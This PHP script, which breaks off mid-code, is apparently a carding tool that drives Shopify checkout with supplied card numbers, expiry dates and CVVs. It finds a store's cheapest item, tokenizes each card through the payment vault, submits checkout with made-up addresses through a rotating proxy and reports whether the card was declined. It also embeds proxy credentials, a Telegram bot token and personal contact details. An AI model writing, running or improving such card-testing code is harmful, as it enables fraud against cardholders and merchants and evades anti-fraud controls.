<?php

/***************************************************************************************
 *                                                                                     *
 *   This script automates the Shopify checkout process.                               *
 *   It identifies the product with the minimum price and attempts to complete         *
 *   the checkout process seamlessly.                                                  *
 *                                                                                     *
 *   Developer: @b3_god                                                             *
 *   Contact: Telegram (@b3_god)                                                    *
 *                                                                                     *
 *   Date: 16 November 2024                                                            *
 *                                                                                     *
 ***************************************************************************************/


$maxRetries = 3;
$retryCount = 0;
require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');
start:

// $proxy = validateAndFormatProxy();
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, "http://api.ipify.org?format=json");
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($ch, CURLOPT_TIMEOUT, 10);
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy);

// $proxyresponse = curl_exec($ch);
// $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
// $curl_error = curl_error($ch);
// curl_close($ch);

// if ($http_code === 200 && !empty($proxyresponse)) {
//     $result = [
//         'Response' => 'Proxy Working',
//         'ip' => json_decode($proxyresponse, true)['ip'],
//     ];
// } else {
//     $err = "Proxy Dead";
//     $result = json_encode([
//         'Response' => $err,
//         'ErrorDetails' => $curl_error,
//         'VerboseLog' => $proxyresponse,
//     ]);
//     echo $result;
//     exit;
// }

function generateUSAddress() {
    $statesWithZipRanges = [
        "AL" => ["Alabama", [35000, 36999]],
        "AK" => ["Alaska", [99500, 99999]],
        "AZ" => ["Arizona", [85000, 86999]],
        "AR" => ["Arkansas", [71600, 72999]],
        "CA" => ["California", [90000, 96199]],
        "CO" => ["Colorado", [80000, 81999]],
        "CT" => ["Connecticut", [6000, 6999]],
        "DE" => ["Delaware", [19700, 19999]],
        "FL" => ["Florida", [32000, 34999]],
        "GA" => ["Georgia", [30000, 31999]],
        "OK" => ["Oklahoma", [73000, 74999]],
    ];

    $stateCode = array_rand($statesWithZipRanges);
    $stateData = $statesWithZipRanges[$stateCode];
    $stateName = $stateData[0];
    $zipRange = $stateData[1];

    $zipCode = rand($zipRange[0], $zipRange[1]);

    $streets = ["Main St", "Elm St", "Park Ave", "Oak St", "Pine St"];
    $cities = ["Springfield", "Riverside", "Fairview", "Franklin", "Greenville"];

    $streetNumber = rand(1, 9999);
    $streetName = $streets[array_rand($streets)];
    $city = $cities[array_rand($cities)];

    return [
        'street' => "$streetNumber $streetName",
        'city' => $city,
        'state' => $stateCode,
        'stateName' => $stateName,
        'postcode' => str_pad($zipCode, 5, "0", STR_PAD_LEFT),
        'country' => "US"
    ];
}
function generateFakeAddress($countryCode = 'us') {
    // API URL with specified country code
    $apiUrl = "https://randomuser.me/api/?nat=$countryCode";

    // Proxy context for file_get_contents
    $proxy = 'tcp://gw.dataimpulse.com:823';
    $proxyAuth = base64_encode('76ae20ff1afab170727e:53d778d7bde5d0d0');
    $opts = [
        'http' => [
            'method' => "GET",
            'header' => "Proxy-Authorization: Basic $proxyAuth\r\n",
            'proxy' => $proxy,
            'request_fulluri' => true,
            'timeout' => 10
        ]
    ];
    $context = stream_context_create($opts);

    // Fetch data from API using proxy
    $response = file_get_contents($apiUrl, false, $context);
    if (!$response) {
        return "Failed to fetch data from the API.";
    }

    // Decode the JSON response
    $data = json_decode($response, true);

    if (isset($data['results'][0]['location'])) {
        $location = $data['results'][0]['location'];

        // Map state names to 2-letter codes (for US and AU as examples)
        $stateCodes = [
            'us' => [
                "Alabama" => "AL", "Alaska" => "AK", "Arizona" => "AZ", "Arkansas" => "AR",
                "California" => "CA", "Colorado" => "CO", "Connecticut" => "CT", "Delaware" => "DE",
                "Florida" => "FL", "Georgia" => "GA", "Hawaii" => "HI", "Idaho" => "ID",
                "Illinois" => "IL", "Indiana" => "IN", "Iowa" => "IA", "Kansas" => "KS",
                "Kentucky" => "KY", "Louisiana" => "LA", "Maine" => "ME", "Maryland" => "MD",
                "Massachusetts" => "MA", "Michigan" => "MI", "Minnesota" => "MN", "Mississippi" => "MS",
                "Missouri" => "MO", "Montana" => "MT", "Nebraska" => "NE", "Nevada" => "NV",
                "New Hampshire" => "NH", "New Jersey" => "NJ", "New Mexico" => "NM", "New York" => "NY",
                "North Carolina" => "NC", "North Dakota" => "ND", "Ohio" => "OH", "Oklahoma" => "OK",
                "Oregon" => "OR", "Pennsylvania" => "PA", "Rhode Island" => "RI", "South Carolina" => "SC",
                "South Dakota" => "SD", "Tennessee" => "TN", "Texas" => "TX", "Utah" => "UT",
                "Vermont" => "VT", "Virginia" => "VA", "Washington" => "WA", "West Virginia" => "WV",
                "Wisconsin" => "WI", "Wyoming" => "WY"
            ],
            'au' => [
                "Australian Capital Territory" => "ACT", "New South Wales" => "NSW",
                "Northern Territory" => "NT", "Queensland" => "QLD", "South Australia" => "SA",
                "Tasmania" => "TAS", "Victoria" => "VIC", "Western Australia" => "WA"
            ]
        ];

        $stateName = $location['state'];
        $stateCode = $stateCodes[$countryCode][$stateName] ?? $stateName;

        return [
            'street' => $location['street']['number'] . ' ' . $location['street']['name'],
            'city' => $location['city'],
            'state' => $stateCode,
            'postcode' => (string) $location['postcode'],
            'country' => strtoupper($countryCode)
        ];
    } else {
        return "No address found in the API response.";
    }
}
function generateRandomCoordinates($minLat = -90, $maxLat = 90, $minLon = -180, $maxLon = 180) {
    $latitude = $minLat + mt_rand() / mt_getrandmax() * ($maxLat - $minLat);
    $longitude = $minLon + mt_rand() / mt_getrandmax() * ($maxLon - $minLon);
    return [
        'latitude' => round($latitude, 6), 
        'longitude' => round($longitude, 6)
    ];
}
$randomCoordinates = generateRandomCoordinates();
$latitude = $randomCoordinates['latitude'];
$longitude = $randomCoordinates['longitude'];
function find_between($content, $start, $end) {
  $startPos = strpos($content, $start);
  if ($startPos === false) {
    return '';
}
$startPos += strlen($start);
$endPos = strpos($content, $end, $startPos);
if ($endPos === false) { 
    return'';
}
return substr($content, $startPos, $endPos - $startPos);
}
function output($method, $data) {
    $out = curl_init();

    curl_setopt_array($out, [
        CURLOPT_URL => 'https://api.telegram.org/bot<7248159727:AAEzc2CNStU6H8F3zD4Y5CFIYRSkyhO_TiQ>'.$method.'',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array_merge([
            'parse_mode' => 'HTML'
        ], $data),
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_PROXY => 'gw.dataimpulse.com:823',
        CURLOPT_PROXYUSERPWD => '76ae20ff1afab170727e:53d778d7bde5d0d0',
        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
    ]);

    $result = curl_exec($out);

    curl_close($out);

    return json_decode($result, true);
}
$cc1 = $_GET['cc'];
$cc_partes = explode("|", $cc1);
$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];
/*=====  sub_month  ======*/
$yearcont=strlen($year);
if ($yearcont<=2){
$year = "20$year";
}
if($month == "01"){
$sub_month = "1";
}elseif($month == "02"){
$sub_month = "2";
}elseif($month == "03"){
$sub_month = "3";
}elseif($month == "04"){
$sub_month = "4";
}elseif($month == "05"){
$sub_month = "5";
}elseif($month == "06"){
$sub_month = "6";
}elseif($month == "07"){
$sub_month = "7";
}elseif($month == "08"){
$sub_month = "8";
}elseif($month == "09"){
$sub_month = "9";
}elseif($month == "10"){
$sub_month = "10";
}elseif($month == "11"){
$sub_month = "11";
}elseif($month == "12"){
$sub_month = "12";
}

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);

    if (!is_array($data) || !isset($data['products'])) {
        throw new Exception('Invalid JSON format or missing products key');
    }
    $minPrice = null;
    $minPriceDetails = [
        'id' => null,
        'price' => null,
        'title' => null,
    ];

    foreach ($data['products'] as $product) {
        foreach ($product['variants'] as $variant) {
            $price = (float) $variant['price'];
            if ($price >= 0.01) {
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'],
                        'price' => $variant['price'],
                        'title' => $product['title'],
                    ];
                }
            }
        }
    }
    if ($minPrice === null) {
        throw new Exception('No products found with price greater than or equal to 0.01');
    }

    return $minPriceDetails;
}

$site1 = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);

$site1 = parse_url($site1, PHP_URL_HOST);
$site1 = 'https://' . $site1;
$site1 = filter_var($site1, FILTER_VALIDATE_URL);
if ($site1 === false) {
    $err = 'Invalid URL';
    $result = json_encode([
        'Response' => $err,
    ]);
    echo $result;
    exit;
}

    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
    $site = "$site2/products.json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $site);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Accept: application/json',
    ]);
    curl_setopt($ch, CURLOPT_PROXY, 'gw.dataimpulse.com:823');
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, '76ae20ff1afab170727e:53d778d7bde5d0d0');
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

    $r1 = curl_exec($ch);
    if ($r1 === false) {
        $err = 'Error in 1 req: ' . curl_error($ch);
        $result = json_encode([
            'Response' => $err,
        ]);
        echo $result;
        curl_close($ch);
        exit;
    } else {
        curl_close($ch);

        try {
            $productDetails = getMinimumPriceProductDetails($r1);
            $minPriceProductId = $productDetails['id'];
            $minPrice = $productDetails['price'];
            $productTitle = $productDetails['title'];
        } catch (Exception $e) {
            $err = $e->getMessage();
            $result = json_encode([
                'Response' => $err,
            ]);
        }
    }

if (empty($minPriceProductId)) {
    $err = 'Product id is empty';
    $result = json_encode([
        'Response' => $err,
    ]);
    echo $result;
    exit;
}

$urlbase = $site1;
$domain = parse_url($urlbase, PHP_URL_HOST); 
$cookie = 'cookie.txt';
$prodid = $minPriceProductId;
cart:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'priority: u=0, i',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_PROXY, 'gw.dataimpulse.com:823');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, '76ae20ff1afab170727e:53d778d7bde5d0d0');
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

$headers = [];
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
    list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
    $name = trim($name);
    $value = trim($value);

    // Save the 'Location' header
    if (strtolower($name) === 'location') {
        $headers['Location'] = $value;
    }

    return strlen($headerLine);
});

$response = curl_exec($ch);

if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = 'Error in 1st Req => ' . curl_error($ch);
        $result = json_encode(['Response' => $err, 'Price' => $minPrice]);
        echo $result;
        exit;
    }
}
$finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
$keywords = [
    'stock_problems',
    'Some items in your cart are no longer available. Please update your cart.',
    'This product is currently unavailable.',
    'This item is currently out of stock but will be shipped once available.',
    'Sold Out.',
    'stock-problems'
];

$found = false;
foreach ($keywords as $keyword) {
    if (strpos($response, $keyword) !== false) {
        $found = true;
        break;
    }
}

if ($found) {
    $err = "Item is out of stock";
    $result = json_encode([
        'Response' => $err,
        'Price' => $minPrice
    ]);
    echo $result;
    exit;
}
$web_build_id = find_between($response, 'sha&quot;:&quot;', '&quot;}');
if (empty($web_build_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
    $err = "Declined";
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}
$x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
if (empty($x_checkout_one_session_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
    $err = "Declined";
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}
$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
if (empty($queue_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
    $err = 'Declined';
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}
$currency = find_between($response, '&quot;currencyCode&quot;:&quot;', '&quot;');
$countrycode = find_between($response, '&quot;countryCode&quot;:&quot;', '&quot;,&quot');
$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
if (empty($stable_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
    $err = 'Declined';
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}
$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
if (empty($paymentMethodIdentifier)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
    $err = 'Declined';
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}
$checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
    $checkoutToken = $matches[1];
}
if (strpos($site1, '.us')) {
    $address = [
        'street' => '11n lane avenue south',
        'city' => 'Jacksonville',
        'state' => 'FL',
        'postcode' => '32210',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.uk')) {
    $address = [
        'street' => '11N Mary Slessor Square',
        'city' => 'Dundee',
        'state' => 'SCT',
        'postcode' => 'DD4 6BW',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.in')) {
    $address = [
        'street' => 'bhagirathpura indore',
        'city' => 'indore',
        'state' => 'MP',
        'postcode' => '452003',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.ca')) {
    $address = [
        'street' => '11n Lane Street',
        'city' => "Barry's Bay",
        'state' => 'ON',
        'postcode' => 'K0J 2M0',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.au')) {
    $address = [
        'street' => '94 Swanston Street',
        'city' => 'Wingham',
        'state' => 'NSW',
        'postcode' => '2429',
        'country' => $countrycode,
        'currency' => $currency
    ];
} else {
    $address = [
        'street' => '11n lane avenue south',
        'city' => 'Jacksonville',
        'state' => 'FL',
        'postcode' => '32210',
        'country' => 'US',
        'currency' => 'USD'
    ];
}
// print_r($address);
card:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://checkout.shopifycs.com',
    'priority: u=1, i',
    'referer: https://checkout.shopifycs.com/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_PROXY, 'gw.dataimpulse.com:823');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, '76ae20ff1afab170727e:53d778d7bde5d0d0');
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"",...');

$response2 = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    } else {
    $err = 'cURL error: ' . curl_error($ch);
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}
$response2js = json_decode($response2, true);
$cctoken = $response2js['id'];
if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    } else {
    $err  = 'Declined';
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}
$deliverymethodtype = find_between($response, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;');
$handle = find_between($response, '{&quot;handle&quot;:&quot;', '&quot;');
if ($deliverymethodtype == 'NONE') {
    $proposalPayload = json_encode([
        'query' => 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:Merchan[...]
        'variables' => [
            'sessionInput' => [
                'sessionToken' => $x_checkout_one_session_token
            ],
            'queueToken' => $queue_token,
            'discounts' => [
                'lines' => [],
                'acceptUnexpectedDiscounts' => true
            ],
            'delivery' => [
                'deliveryLines' => [
                    [
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyMatchingConditions' => [
                                'estimatedTimeInTransit' => [
                                    'any' => true
                                ],
                                'shipments' => [
                                    'any' => true
                                ]
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'lines' => [
                                [
                                    'stableId' => $stable_id
                                ]
                            ]
                        ],
                        'deliveryMethodTypes' => [
                            'NONE'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => []
            ],
            'merchandise' => [
                'merchandiseLines' => [
                    [
                        'stableId' => $stable_id,
                        'merchandise' => [
                            'productVariantReference' => [
                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                'properties' => [],
                                'sellingPlanId' => null,
                                'sellingPlanDigest' => null
                            ]
                        ],
                        'quantity' => [
                            'items' => [
                                'value' => 1
                            ]
                        ],
                        'expectedTotalPrice' => [
                            'value' => [
                                'amount' => $minPrice,
                                'currencyCode' => $address['currency']
                            ]
                        ],
                        'lineComponentsSource' => null,
                        'lineComponents' => []
                    ]
                ]
            ],
            'payment' => [
                'totalAmount' => [
                    'any' => true
                ],
                'paymentLines' => [],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address['street'],
                        'city' => $address['city'],
                        'countryCode' => $address['country'],
                        'firstName' => 'garry',
                        'lastName' => 'xd',
                        'phone' => '+918103707894'
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => [
                    'presentmentCurrency' => $address['currency'],
                    'countryCode' => $address['country']
                ],
                'email' => 'sidhumehak572@gmail.com',
                'emailChanged' => false,
                'phoneCountryCode' => $address['country'],
                'marketingConsent' => [],
                'shopPayOptInPhone' => [
                    'countryCode' => $address['country']
                ],
                'rememberMe' => false
            ],
            'tip' => [
                'tipLines' => []
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => [
                    'value' => [
                        'amount' => '0',
                        'currencyCode' => $address['currency']
                    ]
                ],
                'proposedTotalIncludedAmount' => null,
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => []
            ],
            'note' => [
                'message' => null,
                'customAttributes' => []
            ],
            'localizationExtension' => [
                'fields' => []
            ],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => []
            ],
            'optionalDuties' => [
                'buyerRefusesDuties' => false
            ]
        ],
        'operationName' => 'Proposal'
    ]);
} else {
    $proposalPayload = json_encode([
        'query' => 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:Merchan[...]
        'variables' => [
            'sessionInput' => [
                'sessionToken' => $x_checkout_one_session_token
            ],
            'queueToken' => $queue_token,
            'discounts' => [
                'lines' => [],
                'acceptUnexpectedDiscounts' => true
            ],
            'delivery' => [
                'deliveryLines' => [
                    [
                        'destination' => [
                            'partialStreetAddress' => [
                                'address1' => $address['street'],
                                'address2' => '',
                                'city' => $address['city'],
                                'countryCode' => $address['country'],
                                'postalCode' => $address['postcode'],
                                'firstName' => 'garry',
                                'lastName' => 'xd',
                                'zoneCode' => $address['state'],
                                'phone' => '+18103646394',
                                'oneTimeUse' => false,
                                'coordinates' => [
                                    'latitude' => $latitude,
                                    'longitude' => $longitude
                                ]
                            ]
                        ],
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyByHandle' => [
                                'handle' => $handle,
                                'customDeliveryRate' => false
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'any' => true
                        ],
                        'deliveryMethodTypes' => [
                            'SHIPPING'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => []
            ],
            'merchandise' => [
                'merchandiseLines' => [
                    [
                        'stableId' => $stable_id,
                        'merchandise' => [
                            'productVariantReference' => [
                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                'properties' => [],
                                'sellingPlanId' => null,
                                'sellingPlanDigest' => null
                            ]
                        ],
                        'quantity' => [
                            'items' => [
                                'value' => 1
                            ]
                        ],
                        'expectedTotalPrice' => [
                            'value' => [
                                'amount' => $minPrice,
                                'currencyCode' => $address['currency']
                            ]
                        ],
                        'lineComponentsSource' => null,
                        'lineComponents' => []
                    ]
                ]
            ],
            'payment' => [
                'totalAmount' => [
                    'any' => true
                ],
                'paymentLines' => [],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address['street'],
                        'address2' => '',
                        'city' => $address['city'],
                        'countryCode' => $address['country'],
                        'postalCode' => $address['postcode'],
                        'firstName' => 'garry',
                        'lastName' => 'xd',
                        'zoneCode' => $address['state'],
                        'phone' => '+18103646394'
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => [
                    'presentmentCurrency' => $address['currency'],
                    'countryCode' => $address['country']
                ],
                'email' => 'sidhumehak572@gmail.com',
                'emailChanged' => false,
                'phoneCountryCode' => $address['country'],
                'marketingConsent' => [],
                'shopPayOptInPhone' => [
                    'countryCode' => $address['country']
                ],
                'rememberMe' => false
            ],
            'tip' => [
                'tipLines' => []
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => [
                    'value' => [
                        'amount' => '0',
                        'currencyCode' => $address['currency']
                    ]
                ],
                'proposedTotalIncludedAmount' => null,
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => []
            ],
            'note' => [
                'message' => null,
                'customAttributes' => []
            ],
            'localizationExtension' => [
                'fields' => []
            ],
            'shopPayArtifact' => [
                'optIn' => [
                    'vaultEmail' => '',
                    'vaultPhone' => '+91',
                    'optInSource' => 'REMEMBER_ME'
                ]
            ],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => []
            ],
            'optionalDuties' => [
                'buyerRefusesDuties' => false
            ]
        ],
        'operationName' => 'Proposal'
    ]);
}
sleep(0.5);
proposal:

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-GB',
    'content-type: application/json',
    'origin: ' . $urlbase,
    'priority: u=1, i',
    'referer: ' . $urlbase . '/',
    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'shopify-checkout-client: checkout-web/1.0',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-build-id: ' . $web_build_id,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);
curl_setopt($ch, CURLOPT_PROXY, 'gw.dataimpulse.com:823');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, '76ae20ff1afab170727e:53d778d7bde5d0d0');
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_POSTFIELDS, $proposalPayload);

$response3 = curl_exec($ch);
// echo $response3;
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    } else {
    $err = 'cURL error: ' . curl_error($ch);
    $result = json_encode([
        'Response' => $err,
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}
}

$gateres = strtolower($response);
        if (strpos($gateres, 'shopify_payments')) {
            $gateway = 'Normal';
        } else {
            $gateway = find_between($response, 'extensibilityDisplayName&quot;:&quot;', '&quot;,&quot;');
            if (empty($gateway)) {
                $gateway = 'Unknown';
            }
        }
$decoded->data->session->negotiate->result->sellerProposal->payment->availablePaymentLines[1]->paymentMethod->name ?? "null";
$decoded = json_decode($response3);
if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
    $firstStrategy = $decoded->data->session->negotiate->result->sellerProposal;
    if (empty($firstStrategy)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
        $err = 'Declined';
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $minPrice,
            'Gateway' => $gateway,
        ]);
        echo $result;
        exit;
    }
    }
}

    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount)) {
        $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
    }
    if (empty($delamount)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            $err = 'Declined';
            $result = json_encode([
                'Response' => $err,
                'Status' => 'true',
                'Price'=> $minPrice,
                'Gateway' => $gateway,
            ]);
            echo $result;
            // echo $response3;
            exit;
        }
    }
    if (isset($firstStrategy->tax->totalTaxAmount->value->amount)) {
        $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
    }
    elseif (empty($tax)) {
        if ($retryCount < $maxRetries) {
                $retryCount++;
                goto proposal;
        }
        $err = 'Declined';
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $minPrice,
            'Gateway' => $gateway,
        ]);
        echo $result;
        // echo $response3;
        exit;
    }
    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle)) {
        $handle = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle;
        } 
        if (empty($handle)) {
            if ($retryCount < $maxRetries) {
                $retryCount++;
                goto proposal;
            } else {
                $err = 'Declined';
                $result = json_encode([
                    'Response' => $err,
